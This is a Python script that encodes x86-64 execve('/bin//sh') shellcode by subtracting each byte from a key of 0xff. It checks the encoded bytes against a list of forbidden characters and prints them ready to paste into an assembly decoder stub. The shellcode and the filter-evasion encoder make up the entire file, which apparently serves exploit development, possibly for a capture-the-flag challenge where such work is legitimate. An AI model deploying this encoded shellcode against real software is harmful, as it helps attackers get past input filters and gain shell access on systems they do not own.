# Original shellcode in hexadecimal format
originalShellcode = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
# Key should be the one which does not exist in the original shellcode
encodeKey = 0xff

# Encode loop
encodedShellcode = []
for byte in originalShellcode:
    encodedByte = hex(encodeKey - byte)  
    # Ensure each byte is represented by two characters, with leading zeros if necessary
    if len(encodedByte) == 3:  # If the byte is represented by only one character
        encodedByte = "\\x0" + encodedByte[2]
    else:
        encodedByte = "\\x" + encodedByte[2:]
    encodedShellcode.append(encodedByte)

# Add key as the search terminator
encodedShellcode.append(hex(encodeKey).replace("0x", "\\x"))


# Function to check for forbidden bytes in encoded shellcode
def contains_forbidden_bytes(key, encoded_shellcode, forbidden_bytes):
    key = hex(key).replace("0x", "\\x")
    if key in forbidden_bytes:
        print("/!\ The encode key contains forbidden byte: ", key)
        return True
    for byte in encoded_shellcode:
        if byte in forbidden_bytes:
            print("/!\ Contain forbidden byte: ", byte)
            return True
    return False

# Check if encoded shellcode contains forbidden bytes
forbidden_bytes = "\\x3b\\x54\\x62\\x69\\x6e\\x73\\x68\\xf6\\xd2\\xc0\\x5f\\xc9\\x66\\x6c\\x61\\x67"
if contains_forbidden_bytes(encodeKey, encodedShellcode, forbidden_bytes):
    print("/!\ Warning: Encoded shellcode or the encode key contains forbidden bytes.")
else:
    print("Encoded shellcode does not contain forbidden bytes.")


# Convert original shellcode to \x format
formattedOriginalShellcode = ''.join(['\\x{:02x}'.format(byte) for byte in originalShellcode])

# Format encoded shellcode for easy copy-paste
formattedEncodedShellcode = ','.join(encodedShellcode).replace("\\x", "0x")
encodeKey
print("[*] The original Shellcode: ", formattedOriginalShellcode)
print("[*] The key for encoding: ", hex(encodeKey))
print("[!] The encoded Shellcode: ", ''.join(encodedShellcode))
print("[!] Encoded Shellcode for Assembly: ", formattedEncodedShellcode)
